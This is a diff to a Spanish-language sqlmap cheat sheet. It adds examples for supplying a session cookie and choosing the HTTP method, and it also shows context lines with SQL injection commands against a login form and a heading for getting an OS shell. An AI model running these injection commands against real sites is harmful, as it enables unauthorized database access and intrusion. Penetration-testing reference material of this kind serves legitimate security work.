@@ -30,6 +30,12 @@ sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&passwor
 ```
 <br>
 
+Uso de Cookies
+```
+sqlmap -u 'http://prueba.com/info.php?action=login' --cookie="PHPSESSIONS=2wfertyrywsegy34526"
+```
+<br>
+
 Indicar a todas las preguntas un Yes all
 ```
 sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&password=abc" --batch 
@@ -62,6 +68,12 @@ Saber que tipo de base de datos tiene por detras
 ```
 <br>
 
+
+Indicar otro metodo. PUT , HEAD , GET , POST , DELETE , OPTIONS , PATCH
+```
+ --method PUT
+```
+<br>
 
 Shell del S.O
 ```
